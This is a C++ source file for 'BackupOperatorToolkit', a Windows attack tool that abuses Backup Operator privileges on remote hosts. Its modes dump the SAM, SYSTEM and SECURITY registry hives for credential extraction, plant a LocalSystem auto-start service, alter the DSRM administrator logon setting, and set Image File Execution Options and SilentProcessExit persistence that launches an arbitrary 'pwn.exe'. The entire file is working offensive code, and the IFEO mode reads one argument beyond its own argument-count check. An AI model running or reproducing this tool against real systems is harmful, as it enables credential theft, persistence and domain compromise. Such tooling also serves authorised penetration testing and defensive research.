#include <stdio.h>
#include <iostream>
#include <string>
#include <algorithm>
#include <cctype>
#include <Windows.h>

LPCSTR mode = NULL;
LPCSTR behaviour = NULL;
LPCSTR dumppath = NULL;
LPCSTR servicepath = NULL;
LPCSTR target = NULL;
LPCSTR servicename = NULL;
LPCSTR displayname = NULL;
LPCSTR description = NULL;
LPCSTR username = NULL;
LPCSTR password = NULL;
LPCSTR domain = NULL;
LPCSTR ifeoservice = NULL;
LPCSTR ifeoservicepath = NULL;
DWORD value = NULL;

static std::string FormatErrorMessage(DWORD errorCode) {
	LPSTR buffer = NULL;
	DWORD size = FormatMessageA(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPSTR)&buffer,
		0,
		NULL);

	std::string message;
	if (size == 0 || buffer == NULL) {
		message = "Unknown error";
	}
	else {
		message.assign(buffer, size);
		while (!message.empty() && (message.back() == '\r' || message.back() == '\n')) {
			message.pop_back();
		}
		LocalFree(buffer);
	}

	return message;
}

static std::string NormalizeTargetName(LPCSTR machine) {
	if (machine == NULL) {
		return "";
	}
	std::string normalized = machine;
	while (normalized.rfind("\\\\", 0) == 0) {
		normalized.erase(0, 2);
	}
	return normalized;
}

static bool BuildRemoteUncPath(const std::string& machineName, const std::string& originalPath, std::string& uncPath) {
	if (originalPath.empty()) {
		return false;
	}
	if (originalPath.rfind("\\\\", 0) == 0) {
		uncPath = originalPath;
		std::replace(uncPath.begin(), uncPath.end(), '/', '\\');
		return true;
	}

	if (machineName.empty()) {
		return false;
	}

	if (originalPath.size() > 2 && originalPath[1] == ':' && (originalPath[2] == '\\' || originalPath[2] == '/')) {
		uncPath = "\\\\" + machineName + "\\" + static_cast<char>(toupper(static_cast<unsigned char>(originalPath[0]))) + "$" + originalPath.substr(2);
		std::replace(uncPath.begin(), uncPath.end(), '/', '\\');
		return true;
	}

	return false;
}


void help(){
	printf("Usage: BackupOperatorToolkit.exe SERVICE \\\\PATH\\To\\Service.exe \\\\TARGET.DOMAIN.DK SERVICENAME DISPLAYNAME DESCRIPTION\n");
	printf("Usage: BackupOperatorToolkit.exe DSRM \\\\TARGET.DOMAIN.DK 0||1||2\n");
	printf("Usage: BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK [!] If the dump path is local, the dump will be on the remote computer \n");
	printf("Usage: BackupOperatorToolkit.exe IFEO notepad.exe \\\\Path\\To\\pwn.exe \\\\TARGET.DOMAIN.DK \n");
}

void service(){
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SYSTEM\\CurrentControlSet\\Services", "SYSTEM\\CurrentControlSet\\Services\\"};

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryA: %d\n", result);
		exit(0);
	}
	printf("[+] Connecting to Services registry hive\n");
	result = RegOpenKeyExA(hklm, hives[0], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating Service key %s\n", servicename);
	DWORD disposition = 0;
	HKEY svckey = NULL;
	result = RegCreateKeyExA(hkey, servicename, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &svckey, &disposition);
	if (result != 0) {
		printf("[-] Service Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service to Auto start\n");
	DWORD dwStart = SERVICE_AUTO_START;
	result = RegSetKeyValueA(svckey, NULL, "Start", REG_DWORD, &dwStart, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Auto Start Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Type\n");
	DWORD dwType = SERVICE_WIN32_OWN_PROCESS;
	result = RegSetKeyValueA(svckey, NULL, "Type", REG_DWORD, &dwType, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Service Type: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Recovery Action\n");
	DWORD dwErrorControl = 1;
	result = RegSetKeyValueA(svckey, NULL, "ErrorControl", REG_DWORD, &dwErrorControl, sizeof(DWORD));
	if (result != 0) {
		printf("[-] Recovery: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service to run with Local System\n");
	char szObjectName[] = "LocalSystem";
	result = RegSetKeyValueA(svckey, NULL, "ObjectName", REG_SZ, &szObjectName[0], sizeof(szObjectName));
	if (result != 0) {
		printf("[-] Local System Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service DisplayName to %s\n", displayname);
	result = RegSetKeyValueA(svckey, NULL, "DisplayName", REG_SZ, displayname, strlen(displayname) + 1);
	if (result != 0) {
		printf("[-] DisplayName: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Description to %s\n", description);
	result = RegSetKeyValueA(svckey, NULL, "Description", REG_SZ, description, strlen(description) + 1);
	if (result != 0) {
		printf("[-] Description: %d\n", result);
		exit(0);
	}

	printf("[+] Setting Service Path to %s\n", servicepath);
	result = RegSetKeyValueA(svckey, NULL, "ImagePath", REG_EXPAND_SZ, servicepath, strlen(servicepath) + 1);
	if (result != 0) {
		printf("[-] Service Path: %d\n", result);
		exit(0);
	}

	result = RegCloseKey(hkey);
	if (result != 0) {
		printf("[-] RegCloseKey: %d\n", result);
		exit(0);
	}

	printf("\nThe service will be executed when the machine is rebooted.\n");
}

void dsrm() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives = "SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA";

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
		exit(0);
	}

	printf("[+] Opening target hive to write\n");
	result = RegOpenKeyExA(hklm, hives, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}
	printf("[+] Setting DsrmAdminLogonBehavior value to %lu\n", value);
	result = RegSetValueExA(hkey, "DsrmAdminLogonBehavior", NULL, REG_DWORD, (const BYTE*)&value, sizeof(value));
	if (result != 0) {
		printf("[-] RegSetValueExA: %d\n", result);
		exit(0);
	}
	result = RegCloseKey(hkey);
	if (result != 0) {
		printf("[-] RegCloseKey: %d\n", result);
		exit(0);
	}
	
}

void dump() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SAM","SYSTEM","SECURITY" };

	if (dumppath == NULL || dumppath[0] == '\0') {
		printf("[-] Dump path is empty. Please supply a valid destination directory.\n");
		exit(0);
	}

	printf("[+] Connecting to %s registry service\n", target ? target : "local");
	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != ERROR_SUCCESS) {
		std::string connectErrorMessage = FormatErrorMessage(result);
		printf("[-] RegConnectRegistryA: %lu - %s\n", result, connectErrorMessage.c_str());
		exit(0);
	}

	std::string normalizedTarget = NormalizeTargetName(target);

	for (int i = 0; i < 3; i++) {
		const char* hiveName = hives[i];
		std::string dumpDirectory = dumppath;
		if (!dumpDirectory.empty()) {
			char last = dumpDirectory.back();
			if (last != '\\' && last != '/') {
				dumpDirectory.push_back('\\');
			}
		}
		std::string hiveFilePath = dumpDirectory + hiveName;
		std::string remoteHiveFilePath;
		bool hasRemotePath = BuildRemoteUncPath(normalizedTarget, hiveFilePath, remoteHiveFilePath);
		const std::string& verificationPath = hasRemotePath ? remoteHiveFilePath : hiveFilePath;

		printf("[+] Connecting to registry hive: %s\n", hiveName);
		result = RegOpenKeyExA(hklm, hiveName, REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
		if (result != ERROR_SUCCESS) {
			std::string openErrorMessage = FormatErrorMessage(result);
			printf("[-] RegOpenKeyExA: %lu (hive: %s) - %s\n", result, hiveName, openErrorMessage.c_str());
			exit(0);
		}

		printf("[+] Dumping hive to %s\n", hiveFilePath.c_str());
		result = RegSaveKeyA(hkey, hiveFilePath.c_str(), NULL);
		if (result != ERROR_SUCCESS) {
			std::string errorMessage = FormatErrorMessage(result);
			printf("[-] RegSaveKeyA: %lu (hive: %s) - %s\n", result, hiveName, errorMessage.c_str());
			exit(0);
		}

		RegCloseKey(hkey);
	}

	RegCloseKey(hklm);
}

void ifeo() {
	HKEY hklm;
	HKEY hkey;
	DWORD result;

	const char* hives[] = { "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\" };
	

	result = RegConnectRegistryA(target, HKEY_LOCAL_MACHINE, &hklm);
	if (result != 0) {
		printf("[-] RegConnectRegistryW: %d\n", result);
	}

	printf("[+] Connecting to Image File Execution Options registry hive\n");
	result = RegOpenKeyExA(hklm, hives[0], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating ifeo process key %s\n", ifeoservice);
	DWORD disposition = 0;
	HKEY ifeokey = NULL;
	result = RegCreateKeyExA(hkey, ifeoservice, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &ifeokey, &disposition);
	if (result != 0) {
		printf("[-] Process Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting GlobalFlag\n");
	DWORD value = 512;
	LPCSTR Global = "GlobalFlag";
	result = RegSetKeyValueA(ifeokey, NULL, Global, REG_DWORD, (LPBYTE)&value, sizeof(value));
	if (result != 0) {
		printf("[-] GlobalFlag: %d\n", result);
		exit(0);
	}

	printf("[+] Connecting to SilentProcessExit registry hive\n");
	result = RegOpenKeyExA(hklm, hives[1], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
	if (result != 0) {
		printf("[-] RegOpenKeyExA: %d\n", result);
		exit(0);
	}

	printf("[+] Creating ifeo process key %s\n", ifeoservice);
	result = RegCreateKeyExA(hkey, ifeoservice, NULL, NULL, REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &ifeokey, &disposition);
	if (result != 0) {
		printf("[-] Process Key: %d\n", result);
		exit(0);
	}

	printf("[+] Setting ReportingMode\n");
	DWORD ReportingMode = 1;
	result = RegSetKeyValueA(ifeokey, NULL, "ReportingMode", REG_DWORD, (LPBYTE)&ReportingMode, sizeof(ReportingMode));
	if (result != 0) {
		printf("[-] ReportingMode: %d\n", result);
		exit(0);
	}
	printf("[+] Setting MonitorProcess\n");
	result = RegSetKeyValueA(ifeokey, NULL, "MonitorProcess", REG_SZ, (LPBYTE)ifeoservicepath, strlen(ifeoservicepath));
	if (result != 0) {
		printf("[-] MonitorProcess: %d\n", result);
		exit(0);
	}

	printf("\nThe executable will be run when the specified process is exited.\n");

}

int main(int argc, LPCSTR argv[])
{
	if (argc < 2) {
		help();
		return 0;
	}
	mode = argv[1];
	if (strcmp(mode, "SERVICE") == 0) {
		if (argc < 7) {
			help();
			return 0;
		}
		printf("SERVICE MODE\n");
		servicepath = argv[2];
		target = argv[3];
		servicename = argv[4];
		displayname = argv[5];
		description = argv[6];
		service();
	}
	else if (strcmp(mode, "DSRM") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("DSRM MODE\n");
		target = argv[2];
		value = atoi(argv[3]);
		dsrm();
	}
	else if (strcmp(mode, "DUMP") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("DUMP MODE\n");
		dumppath = argv[2];
		target = argv[3];
		dump();
	}
	else if (strcmp(mode, "IFEO") == 0) {
		if (argc < 4) {
			help();
			return 0;
		}
		printf("IFEO MODE\n");
		ifeoservice = argv[2];
		ifeoservicepath = argv[3];
		target = argv[4];
		ifeo();
	}

	else {
		help();
		return 0;
	}
	return 0;
}

